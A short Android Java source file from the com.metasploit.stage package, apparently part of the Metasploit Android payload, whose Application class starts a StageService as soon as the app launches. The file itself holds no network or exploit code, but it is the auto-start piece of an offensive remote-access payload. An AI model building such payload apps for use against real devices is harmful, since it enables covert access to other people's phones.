package com.metasploit.stage;

import android.app.Application;
import android.content.Context;
import android.content.Intent;

public class MyApp extends Application {

    @Override
    public void onCreate() {
        super.onCreate();
        startService(new Intent(getApplicationContext(), StageService.class));
    }
}